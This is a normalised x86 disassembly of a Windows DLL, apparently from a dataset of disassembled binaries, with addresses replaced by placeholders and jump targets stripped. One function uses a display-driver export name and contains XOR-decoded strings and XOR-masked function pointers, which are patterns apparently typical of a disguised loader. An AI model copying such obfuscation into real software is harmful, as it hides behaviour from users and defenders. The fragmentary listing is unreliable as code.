sub eax ecx
je r-xdata
call sub_1007fb15
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_1008141b
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_10041309
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_1002f3c9
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_10030bed
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000217d
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_100021b9
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10016a0d
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_100021f0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
pop ebp
retn
cmp esi 0x1
jbe r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
ADL_Display_DeviceConfig_Get
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008a5fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x588
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x580 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x598 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
lea edx [ esp + 0x34 ]
mov [ esp + 0x10 ] ecx
push edx
mov ecx ebx
mov [ esp + 0x18 ] eax
call sub_1002c780
xor eax eax
mov [ esp + 0x5a0 ] eax
cmp [ esp + 0x70 ] eax
je r-xdata
cmp [ rw-data ] eax
je r-xdata
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov esi [ r--data ]
xor cl cl
call sub_10023d20
test eax eax
je r-xdata
mov [ rw-data ] eax
mov dl [ esi + eax ]
xor dl cl
xor dl 0xcb
inc cl
mov [ esp + eax + 0xd4 ] dl
movzx eax cl
cmp eax 0x1c
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ esp + 0xf0 ] 0x0
xor eax eax
nop
mov eax [ esp + 0x60 ]
push r--data
xor edi edi
lea ecx [ esp + 0x54 ]
call sub_100449d0
lea ebx [ edi + 0x8 ]
test eax eax
je r-xdata
mov esi 0x8
cmp [ esp + 0x64 ] esi
jb r-xdata
mov dl [ esi + eax ]
xor dl cl
xor dl 0x57
inc cl
mov [ esp + eax + 0xcc ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
mov edi 0xf
xor esi esi
mov eax ebx
mov [ esp + 0xd2 ] 0x0
mov [ esp + 0x2c ] edi
mov [ esp + 0x28 ] esi
mov [ esp + 0x18 ] 0x0
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax [ esp + 0x44 ]
push r--data
xor edi edi
lea ecx [ esp + 0x38 ]
call sub_100449d0
test eax eax
je r-xdata
mov eax [ esp + 0x50 ]
cmp [ esp + 0x64 ] ebx
jae r-xdata
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] ax
cmp [ esp + 0x48 ] esi
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
lea ecx [ esp + 0x20 ]
call sub_1003e780
mov [ esp + 0x5a0 ] 0x1
lea eax [ esp + 0xcc ]
mov [ esp + 0xc4 ] edi
mov [ esp + 0xc0 ] esi
mov [ esp + 0xb0 ] 0x0
lea ecx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0xffffffff
push edi
lea edx [ esp + 0x3c ]
push edx
mov ecx rw-data
call sub_1002d970
push eax
call sub_100312c0
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x50 ]
mov ecx [ esp + 0x598 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x580 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esp + 0x34 ]
push ecx
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea eax [ esp + 0xd0 ]
push eax
lea ecx [ esp + 0xb8 ]
call sub_1003e780
lea ecx [ esp + 0xb0 ]
push ecx
lea edx [ esp + 0x7c ]
push r--data
push edx
mov [ esp + 0x5ac ] 0x2
call sub_100282d0
add esp 0xc
push eax
mov edx r--data
lea esi [ esp + 0x98 ]
mov [ esp + 0x5a4 ] 0x3
call sub_100063d0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x5ac ] 0x4
call sub_10004e10
mov ebx 0x10
cmp [ esp + 0xa8 ] ebx
jb r-xdata
cmp [ esp + 0x64 ] ebx
jb r-xdata
mov edi [ GetModuleFileNameW@IAT ]
push 0x104
lea ecx [ esp + 0x180 ]
push ecx
push eax
call edi
test eax eax
je r-xdata
cmp [ esp + 0x64 ] ebx
jb r-xdata
call sub_1000a86e
add esp 0x4
xor esi esi
mov [ esp + 0xa8 ] edi
mov [ esp + 0xa4 ] esi
mov [ esp + 0x94 ] 0x0
cmp [ esp + 0x8c ] ebx
jb r-xdata
mov eax [ esp + 0x94 ]
push eax
call sub_1000a86e
add esp 0x4
xor edx edx
cmp [ esp + 0x48 ] ebx
mov [ esp + 0x60 ] 0x0
jmp r-xdata
mov ecx [ esp + 0x50 ]
push ecx
call sub_1000a86e
add esp 0x4
lea edx [ esp + 0x17c ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ esp + 0x17c ]
push eax
call [ PathAddBackslashW@IAT ]
lea ecx [ esp + 0x17c ]
push ecx
call [ SetCurrentDirectoryW@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] edi
mov [ esp + 0x50 ] ax
cmp [ esp + 0x48 ] ebx
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ esp + 0x5a0 ] 0x1
mov [ esp + 0x8c ] edi
mov [ esp + 0x88 ] esi
mov [ esp + 0x78 ] 0x0
cmp [ esp + 0xc4 ] ebx
jb r-xdata
mov ecx [ esp + 0x78 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ esp + 0x50 ] dx
mov [ esp + 0x64 ] 0x7
jb r-xdata
call sub_10012c20
test eax eax
jne r-xdata
mov ecx [ esp + 0x34 ]
push ecx
jmp r-xdata
xor esi esi
xor edi edi
jmp r-xdata
mov edx [ esp + 0xb0 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ esp + 0x34 ]
push eax
call sub_1004b3c0
mov esi rw-data
mov eax rw-data
call sub_10034740
push 0x11b8
call sub_1002e3ac
add esp 0x4
test eax eax
je r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0xd4 ]
push eax
lea edx [ edi + ecx ]
push edx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
xor eax eax
mov ecx rw-data
mov esi eax
call sub_1005efd0
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
xor edi edi
cmp ecx edi
je r-xdata
add edi 0x108
inc esi
cmp edi 0x6720
jl r-xdata
call sub_1006ccd0
test al al
je r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x2
call sub_10069020
push edx
lea ecx [ esp + 0x98 ]
call sub_1004a920
lea edx [ esp + 0x94 ]
mov ecx 0x1
mov [ esp + 0x5a0 ] 0x5
call sub_10022b50
lea ecx [ esp + 0x94 ]
call sub_100702e0
jmp r-xdata
mov [ rw-data ] eax
call sub_1001c7d0
call sub_1006cb60
call sub_10034290
test eax eax
je r-xdata
cmp [ esp + 0x2c ] ebx
jae r-xdata
cmp [ esp + 0x2c ] ebx
jae r-xdata
mov [ esp + 0x5a0 ] 0x0
cmp [ esp + 0x2c ] ebx
jb r-xdata
call sub_1000fc50
test eax eax
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
mov ecx [ ebp + 0x14 ]
mov edx [ rw-data ]
push ecx
push eax
push edx
jmp r-xdata
lea eax [ esp + 0x18 ]
mov edx [ ebp + 0x14 ]
push edx
push eax
push ecx
lea eax [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
push ecx
call sub_1000a86e
add esp 0x4
call sub_1003e1c0
test eax eax
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
mov eax [ esp + 0x20 ]
imul esi esi 0x108
mov ecx [ rw-data ]
mov edx [ esi + ecx + 0x104 ]
push eax
call edx
cmp [ esp + 0x2c ] ebx
jb r-xdata
mov esi 0x8
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] 0xf
cmp [ esp + 0x64 ] esi
jb r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_1000a86e
add esp 0x4
call sub_10064410
push 0x104
lea ecx [ esp + 0x388 ]
push ecx
push 0x0
call edi
test eax eax
je r-xdata
call sub_10068d50
test eax eax
mov eax [ rw-data ]
je r-xdata
xor edx edx
cmp [ esp + 0x48 ] esi
mov [ esp + 0x60 ] edi
mov ecx [ esp + 0x50 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ rw-data ]
push 0x104
lea edx [ esp + 0x180 ]
push edx
push eax
call edi
test eax eax
je r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
push ecx
call [ ReleaseMutex@IAT ]
mov edx [ rw-data ]
mov al 0x38
mov [ esp + 0x10 ] edx
xor [ esp + 0x10 ] al
xor [ esp + 0x11 ] al
xor [ esp + 0x12 ] al
xor [ esp + 0x13 ] al
mov eax [ rw-data ]
push eax
call [ esp + 0x14 ]
push eax
call [ ReleaseMutex@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov al 0x38
mov [ esp + 0x10 ] ecx
xor [ esp + 0x10 ] al
xor [ esp + 0x11 ] al
xor [ esp + 0x12 ] al
xor [ esp + 0x13 ] al
push edx
call [ esp + 0x14 ]
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call sub_1005ccb0
push rw-data
push rw-data
push eax
mov ecx rw-data
mov ebx rw-data
lea esi [ esp + 0x188 ]
lea edx [ esp + 0x390 ]
call sub_10061580
add esp 0xc
push 0x100
mov [ esp + 0x18 ] eax
call sub_1002e3ac
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x5a0 ] 0x6
test eax eax
je r-xdata
xor edx edx
cmp [ rw-data ] 0x8
mov ecx [ rw-data ]
jae r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
push rw-data
push rw-data
push ecx
mov edx rw-data
mov ecx rw-data
mov edi eax
call sub_1001bb80
mov edx eax
jmp r-xdata
mov ecx rw-data
sub eax ecx
sar eax 0x1
je r-xdata
mov [ esp + 0x5a0 ] 0x0
fld [ rw-data ]
push ecx
fstp [ esp ]
mov [ rw-data ] edx
call sub_10048350
fld [ rw-data ]
push ecx
fstp [ esp ]
call sub_10024230
mov edx [ edx + 0xf4 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
xor edi edi
mov esi rw-data
inc edi
add esi 0x208
cmp edi 0x1e
jb r-xdata
mov eax esi
lea ecx [ eax + 0x2 ]
lea eax [ esi - 0x3e1c ]
lea ecx [ eax + 0x2 ]
jmp r-xdata
call sub_10012100
mov edx [ rw-data ]
mov eax [ edx + 0xf4 ]
push eax
call [ ReleaseMutex@IAT ]
call sub_10059210
push 0x0
push 0x0
push 0x0
push sub_10033b50
push 0x0
push 0x0
call sub_10056858
mov ecx [ rw-data ]
mov [ esp + 0x28 ] ecx
mov cl 0x38
xor [ esp + 0x28 ] cl
xor [ esp + 0x29 ] cl
xor [ esp + 0x2a ] cl
xor [ esp + 0x2b ] cl
add esp 0x18
push eax
call [ esp + 0x14 ]
mov edx [ esp + 0x14 ]
push edx
lea ecx [ esp + 0x7c ]
call sub_10017970
add esp 0x4
mov [ esp + 0x5a0 ] 0x7
mov eax [ esp + 0x88 ]
test eax eax
je r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax ecx
sar eax 0x1
je r-xdata
call sub_10037040
test eax eax
je r-xdata
cmp [ esp + 0x8c ] 0x10
mov ecx [ esp + 0x78 ]
jae r-xdata
lea ecx [ esi + 0x3cf0 ]
mov eax ecx
lea ebx [ eax + 0x2 ]
call sub_100694c0
lea ecx [ esp + 0x78 ]
call sub_10003250
mov ebx 0x8
push 0x0
push eax
mov eax [ rw-data ]
push ecx
push eax
xor edx edx
xor ecx ecx
call sub_10003660
lea ecx [ esp + 0x78 ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax ebx
sar eax 0x1
je r-xdata
movzx edx [ edi * 2 + rw-data ]
test dx dx
je r-xdata
mov eax [ edi * 4 + rw-data ]
push eax
mov eax [ edi * 4 + rw-data ]
push eax
movzx eax [ edi + rw-data ]
push eax
push ecx
push esi
lea ecx [ esi - 0x7b0c ]
push ecx
lea ecx [ esi - 0x3e1c ]
call sub_1003c700
sub_10002afd
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_10002b23
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1005b670
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_1004b131
mov eax esi
sub_10002ba0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10016734
mov [ esi ] ax
add esi 0x2
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_10002bde
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
add esi 0x2
sub_10002c10
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
test [ ebp + 0x8 ] 0x1
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
je r-xdata
push eax
call sub_1000a86e
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10002c6e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100221e0
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_10002ca0
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_10002ce0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086280
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_1002e3ac
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10002d9d
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_10008d33
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_10066b6a
jmp r-xdata
sub_10002e30
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov [ ebp - 0x2c ] edx
xor eax eax
push edi
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
nop
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0xe
jb r-xdata
xor eax eax
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0xf
jb r-xdata
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
mov edi [ edx + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov edi [ edx + 0xc ]
test edi edi
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
push esi
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push edi
push esi
push eax
mov [ ebx + 0x4 ] eax
call sub_1007f580
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x4 ] 0x0
mov edi [ edx + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea ecx [ esi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0x8 ] eax
call sub_1007f580
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x8 ] 0x0
mov eax [ ebp - 0x2c ]
mov ecx [ eax + 0x10 ]
mov [ ebx + 0x10 ] ecx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax + 0x18 ]
mov [ ebx + 0x18 ] ecx
mov eax [ eax + 0x20 ]
pop edi
pop esi
test eax eax
je r-xdata
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea edx [ esi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0xc ] eax
call sub_1007f580
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0xc ] 0x0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov [ ebx + 0x20 ] eax
inc [ eax + 0x1c ]
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0x1c ] eax
call sub_1007f580
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x1c ] 0x0
sub_10002fb1
push 0xc
push r--data
call sub_1007fad0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_10032438
push 0x1e
call sub_10053809
push 0xff
call sub_10067a82
push 0x18
call sub_1005f1fb
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1005b670
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_1007fb15
retn
push edi
call sub_1001b2d2
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_1001b2d2
pop ecx
call sub_1005b670
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000306a
mov eax [ ebp - 0x1c ]
sub_10003080
push ebp
mov ebp esp
push 0xffffffff
push sub_10087239
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x1
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ esi + 0x10 ]
sub eax edx
add eax [ ebx + 0x10 ]
cmp edi eax
ja r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x1 ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
mov ecx esi
call sub_10012830
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_10004e10
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_1003afd0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_10003150
push ebp
mov ebp esp
sub esp 0x10
push esi
xor esi esi
cmp [ ebp + 0x1c ] esi
jbe r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push ebx
add eax 0x8
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp + 0x10 ] 0x1
mov ebx [ ecx + 0x24 ]
cmp [ ebx ] 0x0
mov esi [ ebp - 0x8 ]
lea eax [ ecx + 0x24 ]
movzx edx si
je r-xdata
mov edx [ ebp - 0xc ]
mov cl [ edi ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] cl
push 0x1
lea ecx [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x10 ] esi
call sub_10025a12
mov ecx [ ebp + 0x14 ]
add esp 0x14
cmp ecx esi
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
pop edi
pop ebx
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
call edx
movzx eax ax
mov ebx [ ecx + 0x34 ]
cmp [ ebx ] 0x0
jle r-xdata
mov eax [ ebp + 0x1c ]
dec eax
xor esi esi
inc edi
mov [ ebp + 0x1c ] eax
cmp eax esi
ja r-xdata
mov ecx ebx
dec [ ecx ]
mov eax [ eax ]
mov ecx [ eax ]
lea esi [ ecx + 0x2 ]
mov [ eax ] esi
mov [ ecx ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x14 ]
jne r-xdata
sub_1000321c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
